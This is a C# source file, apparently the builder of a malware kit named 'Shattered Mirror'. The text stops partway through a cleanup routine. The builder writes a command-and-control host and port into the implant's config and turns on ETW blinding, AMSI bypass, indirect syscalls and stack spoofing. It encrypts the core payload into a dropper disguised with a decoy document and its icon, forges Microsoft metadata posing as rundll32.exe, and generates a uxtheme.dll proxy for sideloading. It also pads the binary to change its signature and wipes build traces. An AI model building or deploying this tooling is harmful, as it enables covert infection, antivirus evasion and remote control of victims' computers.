using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Threading;

namespace Builder_GUI
{
    public class PayloadCompiler
    {
        private string _sourceDir;
        private string _outputDir;
        private string _decoyFile;
        private string _c2Domain;
        private string _c2Port;
        private string[] _selectedAtoms;
        private string _autoStartOrder;
        private string _failoverUrl;
        public string DecoyPath { get; set; } = "";
        public StringBuilder BuildLogs { get; private set; } = new StringBuilder();

        private void Log(string msg) {
            BuildLogs.AppendLine(msg);
        }

        private bool _enableEtw;
        private bool _enableAmsi;
        private bool _enableStack;
        private bool _enablePayload;
        private bool _enableIndirect;
        private bool _enableIpc;
        private bool _enableProxy;
        private bool _enableManager;
        private bool _enableVeh;
        private bool _enableCleanup;
        private bool _enableBloat;
        private bool _enableSpoof;
        private string _customPskId;

        public PayloadCompiler(string sourceDir = "..", string outputDir = ".\\Output", string decoyFile = "", 
                               string c2Domain = "127.0.0.1", string c2Port = "6969", 
                               string[]? selectedAtoms = null, string autoStartOrder = "4, 12, 1", string failoverUrl = "",
                               bool enableEtw = true, bool enableAmsi = true, bool enableStack = true,
                               bool enablePayload = true, bool enableIndirect = true,
                               bool enableIpc = true, bool enableProxy = true, bool enableManager = true,
                               bool enableVeh = true, bool enableCleanup = true, bool enableBloat = false, bool enableSpoof = false,
                               string customPskId = "")
        {
            _sourceDir = Path.GetFullPath(sourceDir);
            _outputDir = Path.GetFullPath(outputDir);
            _decoyFile = string.IsNullOrEmpty(decoyFile) ? "" : Path.GetFullPath(decoyFile);
            DecoyPath = _decoyFile;
            _c2Domain = c2Domain.Replace("http://", "").Replace("https://", "").TrimEnd('/');
            _c2Port = c2Port;
            _selectedAtoms = selectedAtoms ?? new string[] { "1", "4", "6", "12", "14" };
            _autoStartOrder = autoStartOrder;
            _failoverUrl = failoverUrl;
            _enableEtw = enableEtw;
            _enableAmsi = enableAmsi;
            _enableStack = enableStack;
            _enablePayload = enablePayload;
            _enableIndirect = enableIndirect;
            _enableIpc = enableIpc;
            _enableProxy = enableProxy;
            _enableManager = enableManager;
            _enableVeh = enableVeh;
            _enableCleanup = enableCleanup;
            _enableBloat = enableBloat;
            _enableSpoof = enableSpoof;
            _customPskId = customPskId;
        }

        public bool BuildPayload()
        {
            BuildLogs.Clear();
            Log("[+] Finalizing Shattered Mirror Polymorphic Build...");
            Log($"[*] C2 Target: {_c2Domain}:{_c2Port}");

            // Generate building-specific cryptographic keys
            string sessionKey = string.IsNullOrEmpty(_customPskId) ? GenerateRandomString(16) : _customPskId;
            string xorKey = GenerateRandomString(12);
            string payloadXorKey = GenerateRandomString(16);

            Log($"[*] Generated session key: {sessionKey}");
            Log($"[*] Generated XOR key (Decoy): {xorKey}");
            Log($"[*] Generated XOR key (Payload): {payloadXorKey}");

            string batPath = "";
            try {
                // 2. Perform dynamic configuration injection into Config.h
                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\s*\*?\s*C2_DOMAIN\s*=\s*""([^""]+)""", $@"static const char *C2_DOMAIN = ""{_c2Domain}""");
                RegexReplaceInFile("Orchestrator\\Config.h", @"static const int\s*PUBLIC_PORT\s*=\s*(\d+)", $@"static const int PUBLIC_PORT = {_c2Port}");
                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\s*\*?\s*PSK_ID\s*=\s*""([^""]+)""", $@"static const char *PSK_ID = ""{sessionKey}""");
                
                // Dynamically inject the user's custom auto-start sequence
                string autoStartSequence = string.IsNullOrEmpty(_autoStartOrder) ? "0" : _autoStartOrder;
                RegexReplaceInFile("Orchestrator\\Config.h", @"static const DWORD\s+AUTO_START_ATOMS\[\]\s*=\s*\{[^}]*\};", $@"static const DWORD AUTO_START_ATOMS[] = {{{autoStartSequence}}};");



                // Inject failover URL if provided
                if (!string.IsNullOrEmpty(_failoverUrl)) {
                    RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\s*\*?\s*FAILOVER_URL\s*=\s*""([^""]+)""", $@"static const char *FAILOVER_URL = ""{_failoverUrl}""");
                    Log($"[*] Failover URL: {_failoverUrl}");
                }

                // Inject preprocessor macros to enable/disable components surgically
                for (int i = 1; i <= 20; i++) {
                    string atomDefine = $"ATOM_{i}_ENABLED";
                    bool isSelected = _selectedAtoms.Contains(i.ToString());
                    ToggleDefineInFile("Orchestrator\\Config.h", atomDefine, isSelected);
                }

                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_ETW_BLIND_ENABLED", _enableEtw);
                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_AMSI_BYPASS_ENABLED", _enableAmsi);
                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_STACK_SPOOF_ENABLED", _enableStack);
                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_INDIRECT_SYSCALLS_ENABLED", _enableIndirect);
                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_IPC_CHANNEL_ENABLED", _enableIpc);
                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_PROXY_LOGIC_ENABLED", _enableProxy);
                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_ATOM_MANAGER_ENABLED", _enableManager);
                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_VEH_HANDLER_ENABLED", _enableVeh);

                // Update the boolean constants in Config.h as well for runtime checks
                RegexReplaceInFile("Orchestrator\\Config.h", @"static const bool ENABLE_ETW_BLIND\s*=\s*\w+;", $@"static const bool ENABLE_ETW_BLIND = {(_enableEtw ? "true" : "false")};");
                RegexReplaceInFile("Orchestrator\\Config.h", @"static const bool ENABLE_AMSI_BYPASS\s*=\s*\w+;", $@"static const bool ENABLE_AMSI_BYPASS = {(_enableAmsi ? "true" : "false")};");
                RegexReplaceInFile("Orchestrator\\Config.h", @"static const bool ENABLE_STACK_SPOOF\s*=\s*\w+;", $@"static const bool ENABLE_STACK_SPOOF = {(_enableStack ? "true" : "false")};");

                // Inject payload extraction toggle into Dropper template
                string dropperPath = Path.Combine(_sourceDir, "Builder_GUI\\Dropper_Template.cpp");
                string dropperContent = File.ReadAllText(dropperPath);
                dropperContent = System.Text.RegularExpressions.Regex.Replace(dropperContent, @"#define FEATURE_PAYLOAD_EXTRACTION_ENABLED\r?\n", "");
                if (_enablePayload) dropperContent = "#define FEATURE_PAYLOAD_EXTRACTION_ENABLED\r\n" + dropperContent;
                File.WriteAllText(dropperPath, dropperContent);

                // Inject build keys into Dropper template
                RegexReplaceInFile("Builder_GUI\\Dropper_Template.cpp", @"#define PAYLOAD_KEY ""([^""]+)""", $@"#define PAYLOAD_KEY ""{payloadXorKey}""");
                RegexReplaceInFile("Builder_GUI\\Dropper_Template.cpp", @"#define DECOY_KEY ""([^""]+)""", $@"#define DECOY_KEY ""{xorKey}""");

                // Batch-update all Atoms using the same robust regex logic
                string atomsDir = Path.Combine(_sourceDir, "Atoms");
                if (Directory.Exists(atomsDir)) {
                    foreach (string file in Directory.GetFiles(atomsDir, "*.cpp")) {
                        string relPath = Path.GetRelativePath(_sourceDir, file);
                        RegexReplaceInFile(relPath, @"BYTE SharedSessionKey\[\] = ""([^""]+)""", $@"BYTE SharedSessionKey[] = ""{sessionKey}""");
                    }
                }

                // 3. Prepare the Dynamic Proxy Header (Only if enabled)
                if (_enableProxy) {
                    Log("[*] Dynamically resolving UXTheme exports from system...");
                    ResolveDynamicExports();
                }

                // 4. Prepare the Decoy File (or empty payload if none)
                bool hasDecoy = !string.IsNullOrEmpty(DecoyPath) && File.Exists(DecoyPath);
                if (hasDecoy) {
                    Log($"[*] Embedding user decoy: {Path.GetFileName(DecoyPath)}");
                    PrepareDecoy(xorKey, DecoyPath);
                } else {
                    Log("[*] No decoy selected. Building silent payload.");
                    PrepareEmptyDecoy();
                }

                // 5. Generate the build script that compiles and encrypts everything
                string buildScript = GenerateBuildBat(payloadXorKey);
                batPath = Path.Combine(_sourceDir, "_shattered_build_tmp.bat");
                File.WriteAllText(batPath, buildScript);
                Log("[+] Generated temporary build pipeline.");

                // 6. Automatically Run the Build (One-Click Magic)
                Log("[*] Executing Compiler Pipeline (This may take a moment)...");
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", $"/c \"\"{batPath}\"\"")
                {
                    WorkingDirectory = _sourceDir,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                };
                
                using (Process? process = Process.Start(psi))
                {
                    if (process == null) return false;
                    
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    
                    if (!string.IsNullOrEmpty(output)) Log(output);
                    
                    if (process.ExitCode != 0) {
                        string logFile = Path.Combine(_outputDir, "build_error.log");
                        File.WriteAllText(logFile, output + "\n" + error);
                        Log($"[!] BUILD FAILED. Error log saved to: {logFile}");
                        return false;
                    }
                }
                
                Log("[+] Build Pipeline Completed Perfectly.");
                
                // 7. Finalize Naming
                string finalExe = Path.Combine(_outputDir, "Shattered_Mirror.exe");
                string builtExe = Path.Combine(_sourceDir, "Dropper.exe");
                
                if (File.Exists(builtExe)) {
                    Directory.CreateDirectory(_outputDir);
                    
                    if (File.Exists(finalExe)) File.Delete(finalExe);
                    File.Move(builtExe, finalExe);
                    
                    // 8. Bloat the final EXE if enabled
                    if (_enableBloat) {
                        Log("[*] Applying binary bloat for signature randomization...");
                        BloatFile(finalExe);
                    }
                    Log($"[+] Payload Ready: {finalExe}");
                }
                
                return true;
            }
            catch (Exception ex)
            {
                Log($"[!] Build logic failed: {ex.Message}");
                return false;
            }
            finally
            {
                if (_enableCleanup) CleanupArtifacts(batPath);
            }
        }

        private void PrepareEmptyDecoy()
        {
            // Create empty decoy.bin (just a single byte to satisfy resource compiler)
            byte[] empty = new byte[1] { 0x00 };
            string decoyBinPath = Path.Combine(_sourceDir, "Builder_GUI\\decoy.bin");
            File.WriteAllBytes(decoyBinPath, empty);

            // Create a professional .rc file with Microsoft metadata (only if spoofing enabled)
            StringBuilder rcContent = new StringBuilder();
            rcContent.AppendLine("#include <windows.h>");
            rcContent.AppendLine("VS_VERSION_INFO VERSIONINFO");
            rcContent.AppendLine(" FILEVERSION 10,0,19041,1");
            rcContent.AppendLine(" PRODUCTVERSION 10,0,19041,1");
            rcContent.AppendLine(" FILEFLAGSMASK 0x3fL");
            rcContent.AppendLine(" FILEFLAGS 0x0L");
            rcContent.AppendLine(" FILEOS 0x40004L");
            rcContent.AppendLine(" FILETYPE 0x1L");
            rcContent.AppendLine(" FILESUBTYPE 0x0L");
            rcContent.AppendLine("BEGIN");

            string company = _enableSpoof ? "Microsoft Corporation" : "Shattered Workspace";
            string desc = _enableSpoof ? "Windows Host Process (Rundll32)" : "Shattered Core Utility";
            string internalName = _enableSpoof ? "rundll32.exe" : "ShatteredCore.exe";

            rcContent.AppendLine("    BLOCK \"StringFileInfo\"");
            rcContent.AppendLine("    BEGIN");
            rcContent.AppendLine("        BLOCK \"040904b0\"");
            rcContent.AppendLine("        BEGIN");
            rcContent.AppendLine($"            VALUE \"CompanyName\", \"{company}\"");
            rcContent.AppendLine($"            VALUE \"FileDescription\", \"{desc}\"");
            rcContent.AppendLine("            VALUE \"FileVersion\", \"10.0.19041.1 (WinBuild.160101.0800)\"");
            rcContent.AppendLine($"            VALUE \"InternalName\", \"{internalName}\"");
            rcContent.AppendLine($"            VALUE \"LegalCopyright\", \"© {company}. All rights reserved.\"");
            rcContent.AppendLine($"            VALUE \"OriginalFilename\", \"{internalName}\"");
            rcContent.AppendLine("            VALUE \"ProductName\", \"Microsoft® Windows® Operating System\"");
            rcContent.AppendLine("            VALUE \"ProductVersion\", \"10.0.19041.1\"");
            rcContent.AppendLine("        END");
            rcContent.AppendLine("    END");
            rcContent.AppendLine("    BLOCK \"VarFileInfo\"");
            rcContent.AppendLine("    BEGIN");
            rcContent.AppendLine("        VALUE \"Translation\", 0x409, 1200");
            rcContent.AppendLine("    END");
            rcContent.AppendLine("END");

            if (_enablePayload) {
                rcContent.AppendLine("102 RCDATA \"payload.bin\"");
            }
            rcContent.AppendLine("1 RT_MANIFEST \"Builder_GUI\\\\app.manifest\"");

            File.WriteAllText(Path.Combine(_sourceDir, "Builder_GUI\\dropper.rc"), rcContent.ToString());

            // Create a professional manifest (only if spoofing enabled, otherwise generic)
            string manifestName = _enableSpoof ? "Microsoft.Windows.System.ServiceHost" : "Shattered.Core.Utility";
            string manifestDesc = _enableSpoof ? "Windows System Service Host" : "Shattered Core Utility";

            string manifest = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n" +
                               "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\r\n" +
                               $"<assemblyIdentity name=\"{manifestName}\" processorArchitecture=\"amd64\" version=\"10.0.19041.1\" type=\"win32\"/>\r\n" +
                               $"<description>{manifestDesc}</description>\r\n" +
                               "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo>\r\n" +
                               "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\r\n" +
                               "<application><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application>\r\n" +
                               "</compatibility></assembly>";
            File.WriteAllText(Path.Combine(_sourceDir, "Builder_GUI\\app.manifest"), manifest);
        }


        private void BloatFile(string filePath)
        {
            if (!File.Exists(filePath)) return;
            
            using (FileStream fs = new FileStream(filePath, FileMode.Append))
            {
                // Use Zeros (low entropy) for bloat, and only 1MB to avoid triggering size-based heuristics
                byte[] junk = new byte[1024 * 1024 * 1]; 
                Array.Clear(junk, 0, junk.Length);
                fs.Write(junk, 0, junk.Length);
            }
        }


        private void RegexReplaceInFile(string relativePath, string pattern, string replacement)
        {
            string fullPath = Path.Combine(_sourceDir, relativePath);
            if (!File.Exists(fullPath)) return;

            string content = File.ReadAllText(fullPath);
            string newContent = System.Text.RegularExpressions.Regex.Replace(content, pattern, replacement);
            
            if (content != newContent)
            {
                File.WriteAllText(fullPath, newContent, Encoding.UTF8);
            }
        }

        private void ToggleDefineInFile(string relativePath, string define, bool enable)
        {
            string fullPath = Path.Combine(_sourceDir, relativePath);
            if (!File.Exists(fullPath)) return;

            string content = File.ReadAllText(fullPath);
            
            // Pattern to find either commented or uncommented define. 
            // Handles "// #define", "//#define", "#define", etc.
            string pattern = @"(?m)^(/+[\t ]*)?#define[\t ]+" + define + @".*$";
            
            string replacement = enable ? $"#define {define}" : $"// #define {define}";

            if (System.Text.RegularExpressions.Regex.IsMatch(content, pattern)) {
                content = System.Text.RegularExpressions.Regex.Replace(content, pattern, replacement);
            } else if (enable) {
                // If not found and we want to enable it, add it to the end of the file safely
                content += "\r\n#define " + define;
            }

            File.WriteAllText(fullPath, content, Encoding.UTF8);
        }

        private void KillLockingProcesses()
        {
            try {
                foreach (var proc in Process.GetProcessesByName("NoteSvc")) proc.Kill();
                foreach (var proc in Process.GetProcessesByName("Shattered_Mirror")) proc.Kill();
                Thread.Sleep(500);
            } catch { }
        }

        private void PrepareDecoy(string xorKey, string filePath)
        {
            byte[] data = File.ReadAllBytes(filePath);
            string ext = Path.GetExtension(filePath).TrimStart('.');
            
            // Format: [1 byte ext len][ext string][data]
            byte[] extBytes = Encoding.ASCII.GetBytes(ext);
            List<byte> combined = new List<byte>();
            combined.Add((byte)extBytes.Length);
            combined.AddRange(extBytes);
            combined.AddRange(data);

            byte[] encrypted = XORScale(combined.ToArray(), xorKey);
            File.WriteAllBytes(Path.Combine(_sourceDir, "Builder_GUI\\decoy.bin"), encrypted);

            // Extract Icon to match the decoy
            string iconPath = Path.Combine(_sourceDir, "Builder_GUI\\decoy.ico");
            if (File.Exists(iconPath)) File.Delete(iconPath);
            ExtractIconAndSave(filePath, iconPath);
            
            // Generate professional resource file with Manifest, VersionInfo and Icon
            StringBuilder rcContent = new StringBuilder();
            rcContent.AppendLine("#include <windows.h>");
            rcContent.AppendLine("VS_VERSION_INFO VERSIONINFO");
            rcContent.AppendLine(" FILEVERSION 10,0,19041,1");
            rcContent.AppendLine(" PRODUCTVERSION 10,0,19041,1");
            rcContent.AppendLine(" FILEFLAGSMASK 0x3fL");
            rcContent.AppendLine(" FILEFLAGS 0x0L");
            rcContent.AppendLine(" FILEOS 0x40004L");
            rcContent.AppendLine(" FILETYPE 0x1L");
            rcContent.AppendLine(" FILESUBTYPE 0x0L");
            rcContent.AppendLine("BEGIN");
            rcContent.AppendLine("    BLOCK \"StringFileInfo\"");
            rcContent.AppendLine("    BEGIN");
            rcContent.AppendLine("        BLOCK \"040904b0\"");
            rcContent.AppendLine("        BEGIN");
            rcContent.AppendLine("            VALUE \"CompanyName\", \"Microsoft Corporation\"");
            rcContent.AppendLine("            VALUE \"FileDescription\", \"Windows Host Process (Rundll32)\"");
            rcContent.AppendLine("            VALUE \"FileVersion\", \"10.0.19041.1 (WinBuild.160101.0800)\"");
            rcContent.AppendLine("            VALUE \"InternalName\", \"rundll32.exe\"");
            rcContent.AppendLine("            VALUE \"LegalCopyright\", \"© Microsoft Corporation. All rights reserved.\"");
            rcContent.AppendLine("            VALUE \"OriginalFilename\", \"rundll32.exe\"");
            rcContent.AppendLine("            VALUE \"ProductName\", \"Microsoft® Windows® Operating System\"");
            rcContent.AppendLine("            VALUE \"ProductVersion\", \"10.0.19041.1\"");
            rcContent.AppendLine("        END");
            rcContent.AppendLine("    END");
            rcContent.AppendLine("    BLOCK \"VarFileInfo\"");
            rcContent.AppendLine("    BEGIN");
            rcContent.AppendLine("        VALUE \"Translation\", 0x409, 1200");
            rcContent.AppendLine("    END");
            rcContent.AppendLine("END");

            rcContent.AppendLine("101 RCDATA \"Builder_GUI\\\\decoy.bin\"");
            rcContent.AppendLine("102 RCDATA \"payload.bin\"");
            rcContent.AppendLine("1 RT_MANIFEST \"Builder_GUI\\\\app.manifest\"");
            if (File.Exists(iconPath)) {
                rcContent.AppendLine("MAINICON ICON \"Builder_GUI\\\\decoy.ico\"");
            }

            File.WriteAllText(Path.Combine(_sourceDir, "Builder_GUI\\dropper.rc"), rcContent.ToString());

            // Create a professional manifest
            string manifest = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n" +
                              "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\r\n" +
                              "<assemblyIdentity name=\"Microsoft.Windows.System.ServiceHost\" processorArchitecture=\"amd64\" version=\"10.0.19041.1\" type=\"win32\"/>\r\n" +
                              "<description>Windows System Service Host</description>\r\n" +
                              "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo>\r\n" +
                              "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\r\n" +
                              "<application><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application>\r\n" +
                              "</compatibility></assembly>";
            File.WriteAllText(Path.Combine(_sourceDir, "Builder_GUI\\app.manifest"), manifest);
        }

        private void ExtractIconAndSave(string filePath, string outIcoPath)
        {
            try {
                string psCommand = "Add-Type -AssemblyName System.Drawing; " +
                                   "$icon = [System.Drawing.Icon]::ExtractAssociatedIcon('" + filePath.Replace("'", "''") + "'); " +
                                   "if ($icon -ne $null) { " +
                                   "  $fs = New-Object System.IO.FileStream('" + outIcoPath.Replace("'", "''") + "', [System.IO.FileMode]::Create); " +
                                   "  $icon.Save($fs); " +
                                   "  $fs.Close(); " +
                                   "}";
                
                ProcessStartInfo psi = new ProcessStartInfo("powershell", $"-NoProfile -Command \"{psCommand}\"") {
                    CreateNoWindow = true, UseShellExecute = false
                };
                Process.Start(psi)?.WaitForExit();
            } catch (Exception ex) {
                Log($"[!] Icon extraction failed: {ex.Message}");
            }
        }



        private string ApplySpoofing()
        {
            string finalExe = Path.Combine(_sourceDir, "Dropper.exe");
            if (!File.Exists(finalExe)) return "";
            
            string newName = "Shattered_Mirror.exe";
            
            string destPath = Path.Combine(_sourceDir, newName);
            if (File.Exists(destPath)) File.Delete(destPath);
            File.Move(finalExe, destPath);
            return destPath;
        }



        private string GenerateBuildBat(string payloadXorKey)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("@echo off");
            // Dynamic VS Build Tools detection via vswhere
            sb.AppendLine("SET \"VSWHERE=%ProgramFiles(x86)%\\Microsoft Visual Studio\\Installer\\vswhere.exe\"");
            sb.AppendLine("if not exist \"%VSWHERE%\" (");
            sb.AppendLine("  echo [!] vswhere.exe not found. Install VS Build Tools.");
            sb.AppendLine("  exit /b 1");
            sb.AppendLine(")");
            sb.AppendLine("for /f \"usebackq tokens=*\" %%i in (`\"%VSWHERE%\" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do set \"VS_INSTALL=%%i\"");
            sb.AppendLine("if not defined VS_INSTALL (");
            sb.AppendLine("  echo [!] No VS installation with C++ tools found.");
            sb.AppendLine("  exit /b 1");
            sb.AppendLine(")");
            sb.AppendLine("SET \"VS_PATH=%VS_INSTALL%\\VC\\Auxiliary\\Build\\vcvars64.bat\"");
            sb.AppendLine("if not exist \"%VS_PATH%\" ( echo [!] vcvars64.bat not found! && exit /b 1 )");
            sb.AppendLine("call \"%VS_PATH%\"");
            sb.AppendLine("");
            sb.AppendLine("echo [*] Compiling Shattered Mirror CORE (ShatteredCore.exe)...");
            sb.AppendLine("if not exist \"build\" mkdir build");
            sb.AppendLine("rc.exe /nologo /i Orchestrator /fo build\\resources.res Orchestrator\\resources.rc");

            if (_enableIndirect)
            {
                sb.AppendLine("echo [*] Assembling Indirect Syscalls...");
                sb.AppendLine("ml64 /c /Fo build\\IndirectSyscalls.obj Evasion_Suite\\IndirectSyscalls.asm");
            }

            if (!_enableProxy) {
                sb.AppendLine("echo #include ^<windows.h^> > build\\stub_main.cpp");
                sb.AppendLine("echo int main() { return 0; } >> build\\stub_main.cpp");
            }

            sb.AppendLine("cl.exe /EHsc /O2 /GS- /I . /I Evasion_Suite\\include /Fo:build\\ ^");
            StringBuilder coreFiles = new StringBuilder();
            if (_enableProxy) coreFiles.Append("Orchestrator\\ProxyLogic.cpp ");
            else coreFiles.Append("build\\stub_main.cpp ");

            if (_enableVeh) coreFiles.Append("Orchestrator\\VEH_Handler.cpp "); 
            if (_enableManager) coreFiles.Append("Orchestrator\\AtomManager.cpp ");
            if (_enableIpc) coreFiles.Append("Orchestrator\\IPC_Channel.cpp ");
            
            sb.AppendLine($"{coreFiles.ToString()} ^");
            
            StringBuilder evasionFiles = new StringBuilder();
            evasionFiles.Append("Evasion_Suite\\src\\indirect_syscall.cpp "); 
            if (_enableEtw) evasionFiles.Append("Evasion_Suite\\src\\etw_blind.cpp ");
            if (_enableStack) evasionFiles.Append("Evasion_Suite\\src\\stack_encrypt.cpp ");

            StringBuilder atomsList = new StringBuilder();
            foreach (string atomId in _selectedAtoms) {
                string idPad = atomId.PadLeft(2, '0');
                atomsList.Append($"Atoms\\Atom_{idPad}_*.cpp ");
            }

            string objFile = _enableIndirect ? "build\\IndirectSyscalls.obj " : "";
            sb.AppendLine($"{evasionFiles.ToString()} {atomsList.ToString()} {objFile} build\\resources.res ^");
            
            // Dynamic Library Linking
            StringBuilder libs = new StringBuilder();
            libs.Append("user32.lib advapi32.lib shell32.lib "); // Basic libs
            if (_enableProxy || _enableIpc) libs.Append("ole32.lib ");
            if (_enableEtw || _enableAmsi || _enablePayload) libs.Append("bcrypt.lib ");
            if (_enableIpc) libs.Append("winhttp.lib "); // IPC uses winhttp for heartbeats if configured

            sb.AppendLine($"{libs.ToString()} ^");
            sb.AppendLine("/Fe:ShatteredCore.exe");
            sb.AppendLine("");

            if (_enablePayload)
            {
                sb.AppendLine($"echo [*] Encrypting Payload (ShatteredCore.exe -> payload.bin)...");
                sb.AppendLine($"powershell -NoProfile -Command \"$b=[IO.File]::ReadAllBytes('ShatteredCore.exe');$k=[Text.Encoding]::ASCII.GetBytes('{payloadXorKey}');$last=0;for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor ($k[$i %% $k.Length] -bxor $last);$last=$b[$i]}};[IO.File]::WriteAllBytes('payload.bin',$b)\"");
                sb.AppendLine("");
                sb.AppendLine("if not exist \"payload.bin\" ( echo [!] FAILED: payload.bin missing! && exit /b 1 )");
            }
            else
            {
                sb.AppendLine("echo [*] Payload Extraction Disabled. Creating empty decoy payload...");
                sb.AppendLine("echo [DETACHED] > payload.bin");
            }

            sb.AppendLine("echo [*] Packaging Resources...");
            sb.AppendLine("rc.exe /nologo /i Builder_GUI /fo build\\dropper.res Builder_GUI\\dropper.rc");
            sb.AppendLine("echo [*] Compiling Master Stager (Dropper.exe)...");
            sb.AppendLine("cl.exe /EHsc /O2 /GS- /Fo:build\\ Builder_GUI\\Dropper_Template.cpp build\\dropper.res advapi32.lib shell32.lib user32.lib gdi32.lib comdlg32.lib /Fe:Dropper.exe");

            sb.AppendLine("echo [*] Build step status: %errorlevel%");
            sb.AppendLine("exit /b 0");
            return sb.ToString();
        }

        private void ResolveDynamicExports()
        {
            string systemPath = "C:\\Windows\\System32\\uxtheme.dll";
            if (!File.Exists(systemPath)) return;

            StringBuilder exports = new StringBuilder();
            exports.AppendLine("/* DYNAMICALLY GENERATED BY SHATTERED BUILDER */");
            
            string psCommand = "$ErrorActionPreference = 'Stop'; $file = '" + systemPath + "'; " +
                "$bytes = [System.IO.File]::ReadAllBytes($file); " +
                "$offset = [System.BitConverter]::ToInt32($bytes, 0x3C); " +
                "$exportDirRva = [System.BitConverter]::ToInt32($bytes, $offset + 0x88); " +
                "$sectionHeadersStart = $offset + 0x108; $rva = $exportDirRva; " +
                "for($i=0; $i -lt 10; $i++) { " +
                "  $sRva = [System.BitConverter]::ToInt32($bytes, $sectionHeadersStart + ($i * 0x28) + 12); " +
                "  $sSize = [System.BitConverter]::ToInt32($bytes, $sectionHeadersStart + ($i * 0x28) + 8); " +
                "  if($rva -ge $sRva -and $rva -lt ($sRva + $sSize)) { " +
                "    $fo = $rva - $sRva + [System.BitConverter]::ToInt32($bytes, $sectionHeadersStart + ($i * 0x28) + 20); break; " +
                "  } " +
                "} " +
                "$numNames = [System.BitConverter]::ToInt32($bytes, $fo + 0x18); " +
                "$namesRva = [System.BitConverter]::ToInt32($bytes, $fo + 0x20); " +
                "$nfo = $namesRva - $sRva + [System.BitConverter]::ToInt32($bytes, $sectionHeadersStart + ($i * 0x28) + 20); " +
                "for($j=0; $j -lt $numNames; $j++) { " +
                "  $nRva = [System.BitConverter]::ToInt32($bytes, $nfo + ($j * 4)); " +
                "  $nf = $nRva - $sRva + [System.BitConverter]::ToInt32($bytes, $sectionHeadersStart + ($i * 0x28) + 20); " +
                "  $name = ''; while($bytes[$nf] -ne 0) { $name += [char]$bytes[$nf]; $nf++; } " +
                "  Write-Output $name " +
                "}";

            ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", $"-NoProfile -Command \"{psCommand}\"")
            {
                RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
            };

            using (Process? p = Process.Start(psi))
            {
                if (p == null) return;
                while (!p.StandardOutput.EndOfStream)
                {
                    string? name = p.StandardOutput.ReadLine();
                    if (!string.IsNullOrEmpty(name))
                    {
                        string targetPath = "C:\\\\Windows\\\\System32\\\\uxtheme";
                        exports.AppendLine($"#pragma comment(linker, \"/export:{name}={targetPath}.{name}\")");
                    }
                }
                p.WaitForExit();
            }

            for (int ord = 132; ord <= 139; ord++) {
                string targetPath = "C:\\\\Windows\\\\System32\\\\uxtheme";
                exports.AppendLine($"#pragma comment(linker, \"/export:#{ord}={targetPath}.#{ord},@{ord},NONAME\")");
            }

            string proxyPath = Path.Combine(_sourceDir, "Orchestrator\\ProxyLogic.cpp");
            if (File.Exists(proxyPath))
            {
                string content = File.ReadAllText(proxyPath);
                string startTag = "/* START DYNAMIC EXPORTS */";
                string endTag = "/* END DYNAMIC EXPORTS */";

                int start = content.IndexOf(startTag);
                int end = content.IndexOf(endTag);

                if (start != -1 && end != -1)
                {
                    string newContent = content.Substring(0, start + startTag.Length + 1) + 
                                       exports.ToString() + 
                                       content.Substring(end);
                    File.WriteAllText(proxyPath, newContent);
                }
            }
        }

        private byte[] XORScale(byte[] data, string key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        private void CleanupArtifacts(string batPath)
        {
            Log("[*] Ghost Mode: Scrubbing workspace artifacts...");
            try
            {
                // 1. Delete temporary build directory
                string buildDir = Path.Combine(_sourceDir, "build");
                if (Directory.Exists(buildDir))
                {
                    try { 
                        Directory.Delete(buildDir, true); 
                        Log("[*] Build directory incinerated.");
                    } catch { /* Handle locked state silently */ }
                }

                // 2. Define the target list for surgical removal
                List<string> targets = new List<string> {
                    Path.Combine(_sourceDir, "payload.bin"),
                    Path.Combine(_sourceDir, "ShatteredCore.exe"),
                    Path.Combine(_sourceDir, "Dropper.exe"),
                    Path.Combine(_sourceDir, "Builder_GUI\\decoy.bin"),
                    batPath
                };

                // Add any loose .obj or .res files in the root
                if (Directory.Exists(_sourceDir))
                {
                    targets.AddRange(Directory.GetFiles(_sourceDir, "*.obj"));
                    targets.AddRange(Directory.GetFiles(_sourceDir, "*.res"));
                }

                // 3. Persistent deletion loop
                foreach (var target in targets)
                {
                    if (string.IsNullOrEmpty(target)) continue;
                    
                    if (File.Exists(target))
                    {
                        try { 
                            File.Delete(target); 
